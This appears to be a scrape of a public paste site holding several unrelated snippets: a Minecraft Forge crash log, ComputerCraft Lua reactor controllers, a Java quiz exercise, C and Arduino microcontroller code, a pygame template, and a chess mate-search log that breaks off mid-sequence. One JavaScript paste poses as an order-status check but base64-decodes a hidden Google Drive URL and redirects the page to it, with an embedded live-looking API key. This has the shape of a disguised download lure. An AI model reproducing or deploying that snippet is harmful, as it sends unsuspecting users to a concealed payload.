	States: 'U' = Unloaded 'L' = Loaded 'C' = Constructed 'H' = Pre-initialized 'I' = Initialized 'J' = Post-initialized 'A' = Available 'D' = Disabled 'E' = Errored
	UCHIJAAAA	mcp{9.05} [Minecraft Coder Pack] (minecraft.jar) 
	UCHIJAAAA	FML{7.10.99.99} [Forge Mod Loader] (forge-1.7.10-10.13.4.1614-1.7.10.jar) 
	UCHIJAAAA	Forge{10.13.4.1614} [Minecraft Forge] (forge-1.7.10-10.13.4.1614-1.7.10.jar) 
	UCHIJAAAA	TooManyItems{1.7.10} [TooManyItems] (minecraft.jar) 
	UCHIJAAAA	CustomOreGen{1.2.1} [Custom Ore Generation] (14173178507_Custom-Ore-Generation-Revival-Mod-1.7.10.jar) 
	UCHIJAAAA	spawncontroller{3.0.0} [SpawnController] ([1.7.10][ver.3.0.0]SpawnController.jar) 
	UCHIJAAAA	bspkrsCore{6.16} [bspkrsCore] ([1.7.10]bspkrsCore-universal-6.16.jar) 
	UCHIJAAAA	DamageIndicatorsMod{3.3.2} [Damage Indicators] ([1.7.10]DamageIndicatorsMod-3.3.2.jar) 
	UCHIJAAAA	Treecapitator{1.7.10} [Treecapitator] ([1.7.10]Treecapitator-universal-2.0.4.jar) 
	UCHIJAAAA	Backpack{2.0.1} [Backpack] (Backpacks-Mod.jar) 
	UCHIJAAAA	CustomChestLoot{2.0.1} [Custom Chest Loot] (CustomChestLoot-1.7.10-2.0.1.jar) 
	UCHIJAAAA	DPU{1.2.40} [Don't Pick Up] (DPU-1.7.10-1.2.40.jar) 
	UCHIJAAAA	endercompass{1.2} [Ender Compass] (Ender-Compass-Mod-1.7.10.jar) 
	UCHIJAAAA	endercrop{1.7.10-1.1} [Ender Crop] (Ender-Crop-Mod-1.7.10.jar) 
	UCHIJAAAA	moddisruptor{0.2} [Enderman Disruptor Mod] (Enderman-Disruptor-Mod-1.7.10.jar) 
	UCHIJAAAA	enhancedspawners2{0.2} [enhancedspawners2] (EnhancedSpawners2-1.6.jar) 
	UCHIJAAAA	FireBallsForPlayers{0.5} [FireBallsForPlayers] (FireBalls-For-Players-Mod-1.7.10.jar) 
	UCHIJAAAA	iChunUtil{4.2.3} [iChunUtil] (iChunUtil-4.2.3.jar) 
	UCHIJAAAA	instahouse{7.5} [Insta House] (InstaHousev7.5.jar) 
	UCHIJAAAA	ism{2.6.1 MC-1.7.10} [Instant Structures Mod (ISM)] (ism-2.6.1 MC-1.7.10.jar) 
	UCHIJAAAA	cannibal321{1.0} [More Gems + Mod] (More Gems   Mod 1.7.10-1.0.jar) 
	UCHIJAAAA	Morph{0.9.3} [Morph] (Morph-Beta-0.9.3.jar) 
	UCHIJAAAA	naturescompass{1.3.1} [Nature's Compass] (NaturesCompass-1.7.10-1.3.1.jar) 
	UCHIJAAAA	ReiMinimap{1.7.10} [Rei's Minimap] (Reis-Minimap-Mod-1.7.10.jar) 
	UCHIJAAAA	SSTOW{1.7.10-0.1-RC9-7} [Soul Shards: The Old Ways] (SoulShards-TOW-1.7.10-0.1-RC9-7.jar) 
	UCHIJAAAA	tamedmobs{1.0} [ cTamed Mobs] (Tamed Mobs Mod v1.2.jar) 
	UCHIJAAAA	thehackermod{1.7.10} [thehackermod] (The Hacker Mod 1.7 - 1.7.10.jar) 
	UCHIJAAAA	dna948{1.35} [The Last Sword You Will Ever Need Mod] (The-Last-Sword-You-Will-Ever-Need-Mod-1.7.10.jar) 
	UCHIJAAAA	axetomahawk.core{1.4.5.2-1.7.10} [Tomahawks Core] (Tomahawk-Mod-1.7.10.jar) 
	UCHIJAAAA	axetomahawk{1.4.5.2-1.7.10} [Tomahawks] (Tomahawk-Mod-1.7.10.jar) 
	UCHIJAAAA	wyem{0.1.1.4} [WYEM] (wyem-1.7.10_1.1.4.jar) 
	GL info: ~~ERROR~~ RuntimeException: No OpenGL context found in the current thread.
	Profiler Position: N/A (disabled)
	Vec3 Pool Size: 0 (0 bytes; 0 MB) allocated, 0 (0 bytes; 0 MB) used
	Player Count: 1 / 8; [EntityPlayerMP['GonzaloLCDTH'/164, l='Minecraft 2025', x=-149,50, y=66,00, z=242,50]]
	Type: Integrated Server (map_client.txt)
	Is Modded: Definitely; Client brand changed to 'fml,forge'"
4KxV9EMD,reactor,gamekiller,Lua,Monday 14th of April 2025 01:09:59 PM CDT,"--Peripherals

reactor = peripheral.wrap(""back"")
modem =  peripheral.find(""modem"") or error(""No modem attached"", 0)

--Vars

channel = 1001    	--channel open
name = ""Reactor 1""	--name reactor


active = false 
energy_max = reactor.getEnergyCapacity() --FE , 40680 kFE , 40.68 MFE  , 0.04068 GFE
energy_stored = 0 --FE
energy_prod = 0 --FE/t
rod_level = 0 --%
fuel_stored = 0 --mB
fuel_use = 0 --mB/t


--Functions

function autoControl()
	while true do
		local lvl = (energy_stored/energy_max) * 100
		reactor.setAllControlRodLevels(lvl)
		
		active = reactor.getActive()
		energy_stored = reactor.getEnergyStored()
		energy_prod = reactor.getEnergyProducedLastTick()
		fuel_stored = reactor.getFuelAmount()
		fuel_use = reactor.getFuelConsumedLastTick()
		rod_level = reactor.getControlRodLevel(1)
		
		term.clear()
		term.setCursorPos(1,1)
		print(""Active = ""..tostring(active))
		print("""")
		print(""Energy Stock = ""..string.format(""%.2f"",energy_stored).."" FE - ""..string.format(""%.0f"",lvl)..""%"")
		print(""Energy Production = ""..string.format(""%.2f"",energy_prod).."" FE/t"")
		print(""Rods Level = ""..string.format(""%.0f"",rod_level)..""%"")
		print("""")
		print(""Fuel Stock = ""..string.format(""%.2f"",fuel_stored/1000).."" B - use: ""..string.format(""%.2f"",fuel_use).."" mB/t"")
		sleep(1)
	end
end

function listenModem()
	modem.open(channel)
	while true do
		local event,_,ch,rch,msg = os.pullEvent(""modem_message"")
		if msg == ""update"" then
			local data = {name = name, active = active, energy_stored = energy_stored, energy_max = energy_max, energy_prod = energy_prod, fuel_stored = fuel_stored, fuel_use  = fuel_use, rod_level  = rod_level}
			modem.transmit(rch,channel,textutils.serialize(data))
		elseif msg == ""on"" then
			reactor.setActive(true)
		elseif msg == ""off"" then
			reactor.setActive(false)
		end
	end
end

--Main
parallel.waitForAny(autoControl, listenModem)
"
mLXi5pTF,reactor_control,gamekiller,Lua,Monday 14th of April 2025 01:09:29 PM CDT,"--Peripherals

monitor = peripheral.find(""monitor"") or error(""No monitor attached"", 0) --143x38p 7x3monitor
modem = peripheral.find(""modem"") or error(""No modem attached"", 0)

--Vars

modem_Channel = 1000

reactor_1 = { Channel_s= modem_Channel+1, id= 1,datas= {}}
reactor_2 = { Channel_s= modem_Channel+2, id= 2,datas= {}}
reactor_3 = { Channel_s= modem_Channel+3, id= 3,datas= {}}
reactor_4 = { Channel_s= modem_Channel+4, id= 4,datas= {}}

buttons = {}

--Functions

function clear()
	term.clear()
	paintutils.drawFilledBox(1,1,143,38, colors.black)
	term.setCursorPos(1,1)
end

function reactorInit()
	local data = {name = ""Empty"", active = false, energy_stored = 0, energy_max = 0, energy_prod = 0, fuel_stored = 0, fuel_use  = 0, rod_level  = 0, bar = 0}
	reactor_1.datas = data
	newButton(2,reactor_1)
	reactor_2.datas = data
	newButton(31,reactor_2)
	reactor_3.datas = data
	newButton(88,reactor_3)
	reactor_4.datas = data
	newButton(117,reactor_4)
	
	newButton(60,""ON"")
	newButton(74,""OFF"")
	
end

function reactor_upd(r)
print(""Upt ""..r.datas.name)
	while true do
		modem.transmit(r.Channel_s, modem_Channel, ""update"")
		local event, _, ch, rch, msg = os.pullEvent(""modem_message"")
		if event == ""modem_message"" and rch == r.Channel_s then
			local data = textutils.unserialize(msg)
			r.datas = data
			r.datas.bar = string.format(""%.2f"",(r.datas.energy_stored/r.datas.energy_max) * 100)
			
			buttons[r.id].active = r.datas.active
			buttons[r.id].name = r.datas.name
			--r.datas = {name = ""Empty "", active = false, energy_stored = 0, energy_max = 100, energy_prod = 0, fuel_stored = 0, fuel_use  = 0, rod_level  = 0}
		end
		sleep(1)
	end
end

function adaptFE(v)
local txt = """"
	if v < 1000 then --FE
		txt = (string.format(""%.2f"",v).."" FE"")
		return txt
	elseif v >= 1000 and v < 1000000 then --kFE
		txt = (string.format(""%.2f"",(v/1000)).."" kFE"")
		return txt
	elseif v >= 1000000 and v < 1000000000 then --MFE
		txt = (string.format(""%.2f"",(v/1000000)).."" MFE"")
		return txt
	elseif v >= 1000000000 then --GFE
		txt = (string.format(""%.2f"",(v/1000000000)).."" GFE"")
		return txt
	end
end
function adaptmB(v)
	if v < 1000 then --FE
		txt = (string.format(""%.2f"",v).."" mB"")
		return txt
	elseif v >= 1000 and v < 1000000 then --kFE
		txt = (string.format(""%.2f"",(v/1000)).."" B"")
		return txt
	elseif v >= 1000000 and v < 1000000000 then --MFE
		txt = (string.format(""%.2f"",(v/1000000)).."" kB"")
		return txt
	elseif v >= 1000000000 then --GFE
		txt = (string.format(""%.2f"",(v/1000000000)).."" MB"")
		return txt
	end
end

function toggleReactor(id)
	if buttons[id].name == ""ON"" then
		
	elseif buttons[id].name == ""OFF"" then
	
	else
		if buttons[id].active then
			modem.transmit(buttons[id].Channel_s, modem_Channel, ""off"")
		elseif not buttons[id].active then
			modem.transmit(buttons[id].Channel_s, modem_Channel, ""on"")
		end
	end
end

function newButton(x,r) --3x5
	if r.datas ~= nil then
		local new = {name = r.datas.name, active = r.datas.active, Channel_s = r.Channel_s, x = x, y = 34}
		table.insert(buttons, r.id, new)
	elseif r == ""ON"" then
		local new = {name = ""ON"",x = x, y = 34}
		table.insert(buttons, 5, new)
	elseif r == ""OFF"" then
		local new = {name = ""OFF"",x = x, y = 34}
		table.insert(buttons, 6, new)
	end
end

function drawButton(id)
	if buttons[id].name == ""ON"" then
		paintutils.drawFilledBox(buttons[id].x, buttons[id].y, buttons[id].x+4, buttons[id].y+2, colors.green)
		term.setCursorPos(buttons[id].x+1, buttons[id].y+1)
		write""ON""
	elseif buttons[id].name == ""OFF"" then
		paintutils.drawFilledBox(buttons[id].x, buttons[id].y, buttons[id].x+4, buttons[id].y+2, colors.red)
		term.setCursorPos(buttons[id].x+1, buttons[id].y+1)
		write""OFF""
	else
		if buttons[id].name ~= ""Empty"" then
			if not buttons[id].active then
				paintutils.drawFilledBox(buttons[id].x, buttons[id].y, buttons[id].x+4, buttons[id].y+2, colors.green)
				term.setCursorPos(buttons[id].x+1, buttons[id].y+1)
				write""ON""
			elseif buttons[id].active then
				paintutils.drawFilledBox(buttons[id].x, buttons[id].y, buttons[id].x+4, buttons[id].y+2, colors.red)
				term.setCursorPos(buttons[id].x+1, buttons[id].y+1)
				write""OFF""
			end
		end
	end
	term.setBackgroundColor(colors.black)
end

function  checkButton()
	while true do
		local _,_,x,y = os.pullEvent(""monitor_touch"")
		for id, btn in pairs(buttons) do
			if x >= btn.x and x <= btn.x+4 and y >= btn.y and y <= btn.y+2 and btn.name ~= ""Empty"" and btn.name ~= ""ON"" and btn.name ~= ""OFF"" then
				toggleReactor(id)
			elseif x >= btn.x and x <= btn.x+4 and y >= btn.y and y <= btn.y+2 and btn.name == ""ON"" then
				modem.transmit(reactor_1.Channel_s, modem_Channel, ""on"")
				modem.transmit(reactor_2.Channel_s, modem_Channel, ""on"")
				modem.transmit(reactor_3.Channel_s, modem_Channel, ""on"")
				modem.transmit(reactor_4.Channel_s, modem_Channel, ""on"")
			elseif x >= btn.x and x <= btn.x+4 and y >= btn.y and y <= btn.y+2 and btn.name == ""OFF"" then
				modem.transmit(reactor_1.Channel_s, modem_Channel, ""off"")
				modem.transmit(reactor_2.Channel_s, modem_Channel, ""off"")
				modem.transmit(reactor_3.Channel_s, modem_Channel, ""off"")
				modem.transmit(reactor_4.Channel_s, modem_Channel, ""off"")
			end
		end
	sleep(0.5)
	end
end

function energyBar(x,y,value)  --5x20 (3*18)
	local v = math.floor((value/100)*24)
	paintutils.drawBox(x,y,x+4,y+25, colors.gray)
	local color = colors.green
	local percent = tonumber(value)
	if percent >=55 then
		color = colors.green
	elseif percent<55 and percent>=25 then
		color = colors.orange
	elseif percent<25 then
		color = colors.red
	end
	if v>0 then
		paintutils.drawFilledBox(x+1,y+1+(24-v),x+3,y+24, color)
	end
	term.setBackgroundColor(colors.black)
end

function drawReactor(x,reactor)
	term.setCursorPos(x+5,3)
	print(reactor.datas.name)
	energyBar(x+21,8,reactor.datas.bar)
	if reactor.datas.active == true then
		term.setBackgroundColor(colors.green)
	elseif reactor.datas.active == false then
		term.setBackgroundColor(colors.red)
	end
	term.setCursorPos(x,10)
	print(""Actif:  ""..tostring(reactor.datas.active))
	term.setBackgroundColor(colors.black)
	term.setCursorPos(x,20)
	print(""Stock: ""..adaptFE(reactor.datas.energy_stored))
	term.setCursorPos(x,21)
	print(""Prod: ""..adaptFE(reactor.datas.energy_prod)..""/t"")
	term.setCursorPos(x,23)
	print(""Rod: ""..reactor.datas.rod_level..""%"")
	term.setCursorPos(x,25)
	print(""Fuel: ""..adaptmB(reactor.datas.fuel_stored))
	term.setCursorPos(x,26)
	print(""Fuel use: ""..adaptmB(reactor.datas.fuel_use)..""/t"")
	term.setCursorPos(x,32)
	print(""Control:"")
	
	drawButton(reactor.id)
end

function drawAll()
	local x = 60
	
	local stock = reactor_1.datas.energy_stored + reactor_2.datas.energy_stored + reactor_3.datas.energy_stored + reactor_4.datas.energy_stored
	local prod = reactor_1.datas.energy_prod + reactor_2.datas.energy_prod + reactor_3.datas.energy_prod + reactor_4.datas.energy_prod
	local fuel_stored = reactor_1.datas.fuel_stored + reactor_2.datas.fuel_stored + reactor_3.datas.fuel_stored + reactor_4.datas.fuel_stored
	local fuel_use = reactor_1.datas.fuel_use + reactor_2.datas.fuel_use + reactor_3.datas.fuel_use + reactor_4.datas.fuel_use
	
	
	local max = reactor_1.datas.energy_max+reactor_2.datas.energy_max+reactor_3.datas.energy_max+reactor_4.datas.energy_max
	local percent  = math.floor((stock/max)*100)
	
	term.setCursorPos(x+8,3)
	print(""Global"")
	energyBar(x+20,8,percent)

	term.setCursorPos(x,10)
	print(""Actif: "")
	if reactor_1.datas.name ~= ""Empty"" then
		if reactor_1.datas.active then
			term.setBackgroundColor(colors.green)
		elseif not reactor_1.datas.active then
			term.setBackgroundColor(colors.red)
		end
		term.setCursorPos(x,12)
		print""Reactor 1""
	end
	if reactor_2.datas.name ~= ""Empty"" then
		if reactor_2.datas.active then
			term.setBackgroundColor(colors.green)
		elseif not reactor_2.datas.active then
			term.setBackgroundColor(colors.red)
		end
		term.setCursorPos(x,14)
		print""Reactor 2""
	end
	if reactor_3.datas.name ~= ""Empty"" then
		if reactor_3.datas.active then
			term.setBackgroundColor(colors.green)
		elseif not reactor_3.datas.active then
			term.setBackgroundColor(colors.red)
		end
		term.setCursorPos(x,16)
		print""Reactor 3""
	end
	
	if reactor_4.datas.name ~= ""Empty"" then
		if reactor_4.datas.active then
			term.setBackgroundColor(colors.green)
		elseif not reactor_4.datas.active then
			term.setBackgroundColor(colors.red)
		end
		term.setCursorPos(x,18)
		print""Reactor 4""
	end
	
	
	term.setBackgroundColor(colors.black)
	term.setCursorPos(x,22)
	print(""Stock: ""..adaptFE(stock))
	term.setCursorPos(x,23)
	print(""Prod: ""..adaptFE(prod)..""/t"")
	term.setCursorPos(x,25)
	print(""Fuel: ""..adaptmB(fuel_stored))
	term.setCursorPos(x,26)
	print(""Fuel use: ""..adaptmB(fuel_use)..""/t"")
	term.setCursorPos(x+4,32)
	print(""All Control:"")
	
	drawButton(5)
	drawButton(6)

end

--MainFunction
function mainUpt()
print""Upt started""
		parallel.waitForAny(
		function() reactor_upd(reactor_1) end,
		function() reactor_upd(reactor_2) end,
		function() reactor_upd(reactor_3) end,
		function() reactor_upd(reactor_4) end
		)
end

function mainDraw()
print""Draw started""
term.redirect(monitor)
	while true do
		clear()
		--paintutils.drawBox(1,1,100,38, colors.white) --54x38
		paintutils.drawLine(1,1,143,1,colors.white); paintutils.drawLine(1,38,143,38,colors.white); paintutils.drawLine(29,1,29,38,colors.white); paintutils.drawLine(58,1,58,38,colors.white); paintutils.drawLine(86,1,86,38,colors.white); paintutils.drawLine(115,1,115,38,colors.white);
		term.setCursorPos(2,2)
		term.setBackgroundColor(colors.black)
		
		drawReactor(2,reactor_1)
		drawReactor(31,reactor_2)
		drawReactor(88,reactor_3)
		drawReactor(117,reactor_4)
		drawAll()
		
		sleep(1)
	end
end

--Mains

clear()
monitor.clear()
monitor.setTextScale(0.5)
local mx,my = monitor.getSize()
if mx ~= 143 or my ~= 38 then
	error(""Bad screen size, need 7x3 monitor!"",0)
end
modem.open(1000)
reactorInit()

parallel.waitForAny(mainUpt, checkButton, mainDraw)

	"
m1ufRYPv,[NP] Quiz,dzocesrce,Java,Monday 14th of April 2025 12:41:25 PM CDT,"import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.IntSummaryStatistics;
import java.util.List;
import java.util.stream.IntStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class QuizTest {
    public static void main(String[] args) {

        Scanner sc = new Scanner(System.in);

        Quiz quiz = new Quiz();

        int questions = Integer.parseInt(sc.nextLine());

        for (int i=0;i<questions;i++) {
            try {
                quiz.addQuestion(sc.nextLine());
            } catch (InvalidOperationException e) {
                System.out.println(e.getMessage());
            }
        }

        List<String> answers = new ArrayList<>();

        int answersCount =  Integer.parseInt(sc.nextLine());

        for (int i=0;i<answersCount;i++) {
            answers.add(sc.nextLine());
        }

        int testCase = Integer.parseInt(sc.nextLine());

        if (testCase==1) {
            quiz.printQuiz(System.out);
        } else if (testCase==2) {
            try {
                quiz.answerQuiz(answers, System.out);
            } catch (InvalidOperationException e) {
                System.out.println(e.getMessage());
            }
        } else {
            System.out.println(""Invalid test case"");
        }
    }
}

class InvalidOperationException extends Exception{
    public InvalidOperationException(String message) {
        super(message);
    }
}

abstract class Question implements Comparable<Question> {
    private String name;
    private int points;
    private Type type;

    public Question(String name, int points) {
        this.name = name;
        this.points = points;
    }

    public String getName() {
        return name;
    }

    public int getPoints() {
        return points;
    }

    public abstract String getAnswer();

    public abstract Type getType();

}

class MultipleChoiceQuestion extends Question{
    private char answer;
    public MultipleChoiceQuestion(String name, int points, char answer) {
        super(name, points);
        this.answer=answer;
    }

    public String getAnswer() {
        return String.valueOf(answer);
    }

    @Override
    public Type getType() {
        return Type.MC;
    }

    @Override
    public String toString() {
        return String.format(""Multiple Choice Question: %s Points %d Answer: %c"",super.getName(),super.getPoints(),answer);
    }

    @Override
    public int compareTo(Question o) {
        return Integer.compare(super.getPoints(),o.getPoints());
    }
}

class TrueFalseQuestion extends Question{
    private boolean answer;

    public TrueFalseQuestion(String name, int points,boolean answer) {
        super(name, points);
        this.answer=answer;
    }

    public String getAnswer() {
        return String.valueOf(answer);
    }

    @Override
    public Type getType() {
        return Type.TF;
    }

    @Override
    public String toString() {
        return String.format(""True/False Question: %s Points: %d Answer: %s"",super.getName(),super.getPoints(),answer);
    }

    @Override
    public int compareTo(Question o) {
        return Integer.compare(super.getPoints(),o.getPoints());
    }
}

enum Type {
    MC,
    TF
}


class Quiz {
    List<Question> questions;

    public Quiz() {
        this.questions = new ArrayList<>();
    }

    public int checkAnswer(char c){
        return ""ABCDE"".indexOf(c);
    }

    public void addQuestion(String s) throws InvalidOperationException {
        String[] parts= s.split("";"");
        String name= parts[1];
        int points= Integer.parseInt(parts[2]);
        String answer= parts[3];
        if(parts[0].equals(""MC"")){
            if(checkAnswer(answer.charAt(0))==-1)
                throw new InvalidOperationException(answer.charAt(0)+"" is not allowed option for this question"");
            questions.add(new MultipleChoiceQuestion(name,points,answer.charAt(0)));
        }
        else{
            questions.add(new TrueFalseQuestion(name,points,Boolean.parseBoolean(parts[3])));
        }
    }

    public void printQuiz(PrintStream out) {
        PrintWriter printWriter = new PrintWriter(out);

        questions.stream().sorted(Comparator.reverseOrder()).forEach(i->printWriter.println(i));
        printWriter.flush();
    }



    public void answerQuiz(List<String> answers, PrintStream out) throws InvalidOperationException {
        PrintWriter printWriter = new PrintWriter(out);
        if(answers.size()!= questions.size())
            throw new InvalidOperationException(""Answers and questions must be of same length!"");
        double totalPoints=0;
        for(int i=0; i<answers.size();i++){
            if(questions.get(i).getAnswer().equals(answers.get(i))) {
                printWriter.println(String.format(""%d. %.2f"", i+1,(double) questions.get(i).getPoints()));
                totalPoints += questions.get(i).getPoints();
            }
            else{
                if(questions.get(i).getType().equals(Type.MC)){
                    printWriter.println(String.format(""%d. %.2f"",i+1,(double) questions.get(i).getPoints()*0.2*(-1)));
                    totalPoints-=questions.get(i).getPoints()*0.2;
                }
                else{
                    printWriter.println(String.format(""%d. 0.00"",i+1));
                }

            }
        }
        printWriter.println(String.format(""Total points: %.2f"",totalPoints));
        printWriter.flush();
    }
}"
gfRZqiCT,CortexM0 GPO LED,Dani_info,C,Monday 14th of April 2025 12:33:44 PM CDT,"#include <MKL25Z4.h>

//red -> PTB18

#define MASK(x) (1UL << (x))

int main(){
	SIM->SCGC5|=SIM_SCGC5_PORTB_MASK; //enable clock 
	PORTB->PCR[18]&=~PORT_PCR_MUX_MASK; // clear PCR
	PORTB->PCR[18]|=PORT_PCR_MUX(1); //set PB19 as GPIO (MUX1)
	PTB->PDDR|=MASK(18); // set PDDR[18]=1 -> output
	PTB->PSOR=~MASK(18); // set PSOR[18]=0 -> set GPO PB19 LOW to turn on the active LOW LED 
	while (1)
		;
	return 0;
}"
zrDFg95p,clone deep copy,STANAANDREY,C,Monday 14th of April 2025 11:45:39 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NMAX 100
typedef struct {
  int id;
  char name[NMAX];
} Entity;

Entity cloneEntity(const Entity *const ep) {
  Entity aux;
  aux.id = ep->id;
  strncpy(aux.name, ep->name, NMAX);
  return aux;
}

void printEntity(const Entity *const ep) {
  printf(""{ id: %d, name: %s }\n"", ep->id, ep->name);
}

int main(void) {
  Entity e1 = {.id = 1, .name = ""asd""}, e2;
  e2 = cloneEntity(&e1);
  strcat(e2.name, ""123"");
  printEntity(&e1);
  printEntity(&e2);
  return 0;
}"
MiUiLeEv,Lesson 1 - Base,MCreeper12731,Python,Monday 14th of April 2025 11:40:27 AM CDT,"import pygame
pygame.init()
pygame.font.init()

width = 1200
height = 600
window = pygame.display.set_mode((width, height))
pygame.display.set_caption(""Game Title"")

# Class definitions and variables


# Main game loop
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((255, 255, 255))

    # Moving and drawing
    
    pygame.display.update()
    clock.tick(60)

pygame.quit()"
qGkLifpK,Untitled,dllbridge,C,Monday 14th of April 2025 11:25:56 AM CDT,"void setup() 
{
  Serial.begin(9600);                               // –û—Ç–∫—Ä—ã–≤–∞–µ–º –ø–æ—Ä—Ç –Ω–∞ 9600 –±–æ–¥
  pinMode(LED_BUILTIN, OUTPUT);
}

void loop() 
{
  if (Serial.available() > 0)                       // –ï—Å–ª–∏ –ø—Ä–∏—à–ª–∏ –¥–∞–Ω–Ω—ã–µ
  {
    String command = Serial.readStringUntil('\n');  // –ß–∏—Ç–∞–µ–º –¥–æ —Å–∏–º–≤–æ–ª–∞ –Ω–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏
    command.trim();                                 // –£–¥–∞–ª—è–µ–º –ª–∏—à–Ω–∏–µ –ø—Ä–æ–±–µ–ª—ã –∏ —Å–∏–º–≤–æ–ª—ã

    if (command == ""Are_you_Arduino?"")              // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥
    {
      digitalWrite(LED_BUILTIN, HIGH);
      Serial.println(""S_ _Y. Yes, it's Arduino !"");
      delay(50);
      digitalWrite(LED_BUILTIN, LOW);
      return;
    } 

    if (command == ""LED_ON"") 
    {
      digitalWrite(LED_BUILTIN, HIGH);
      Serial.println(""LED is ON"");
    } 
    else if (command == ""LED_OFF"") 
    {
      digitalWrite(LED_BUILTIN, LOW);
      Serial.println(""LED is OFF"");
    } 
    else if (command == ""GET_TEMP"") 
    { 
      float temp = 25.5 + (rand() % 10) / 10.0;       // –ü—Ä–∏–º–µ—Ä: –≤–æ–∑–≤—Ä–∞—â–∞–µ–º ""—Ñ–µ–π–∫–æ–≤—É—é"" —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä—É
      Serial.print(""TEMP:"");
      Serial.println(temp, 1);                        // –û–¥–Ω–∞ —Ü–∏—Ñ—Ä–∞ –ø–æ—Å–ª–µ –∑–∞–ø—è—Ç–æ–π
    } 
    else {
      Serial.print(""UNKNOWN: "");
      Serial.println(command);
    }
  }
}"
3b6UF2Xj,Untitled,x2LeaF,JavaScript,Monday 14th of April 2025 11:14:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75870/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2UzTfwF6,checkmate in 11,max2201111,Python,Monday 14th of April 2025 11:09:21 AM CDT,"Analyzing position: 8/8/8/q7/2k1R3/8/8/3K4 b - - 0 1

Initial position:
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . k . R . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Side to move: Black

No checkmate in one move found.
Proceeding with deeper search...
Searching for mate in 1 moves...
Depth 1 completed in 0.0020 seconds
Searching for mate in 2 moves...
Depth 2 completed in 0.0056 seconds
Searching for mate in 3 moves...
Depth 3 completed in 0.0477 seconds
Searching for mate in 4 moves...
Depth 4 completed in 0.1853 seconds
Searching for mate in 5 moves...
Depth 5 completed in 1.5417 seconds
Searching for mate in 6 moves...
Depth 6 completed in 4.9635 seconds
Searching for mate in 7 moves...
Depth 7 completed in 42.0163 seconds
Searching for mate in 8 moves...
Depth 8 completed in 118.7615 seconds
Searching for mate in 9 moves...
Depth 9 completed in 1461.1566 seconds
Searching for mate in 10 moves...
Depth 10 completed in 25845.2522 seconds
Searching for mate in 11 moves...
Depth 11 completed in 58850.2191 seconds
Mate in 11 found!

Checkmate sequence found:
Move 1: Black plays kc4-d3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . . R . . . 4
3 . . . k . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 2: White plays Re4-d4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . R . . . . 4
3 . . . k . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 3: Black plays kd3-d4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 4: White plays Kd1-e2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . K . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 5: Black plays qa5-f5
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . q . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . K . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 6: White plays Ke2-d2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . q . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . K . . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 7: Black plays qf5-f2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . K . q . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 8: White plays Kd2-c1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . . q . . 2
1 . . K . . . . . 1
  a b c d e f g h
Move 9: Black plays kd4-c3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . . . . . . 4
3 . . k . . . . . 3
2 . . . . . q . . 2
1 . . K . . . . . 1
  a b c d e f g h
Move 10: White plays Kc1-b1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
